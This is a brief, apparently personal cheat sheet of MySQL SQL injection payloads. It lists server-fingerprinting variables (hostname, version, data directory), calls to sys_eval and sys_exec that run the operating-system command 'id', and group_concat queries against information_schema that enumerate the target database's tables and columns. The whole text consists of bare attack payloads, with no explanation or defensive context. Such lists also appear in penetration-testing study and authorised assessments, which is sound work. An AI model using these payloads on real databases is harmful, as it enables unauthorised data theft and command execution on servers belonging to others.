@@hostname
@@version
@@datadir

sys_eval('id')
sys_exec('id')

SELECT group_concat(table_name) from information_schema.tables where table_schema = database()
select group_concat(column_name) from information_schema.columns where table_name = ...
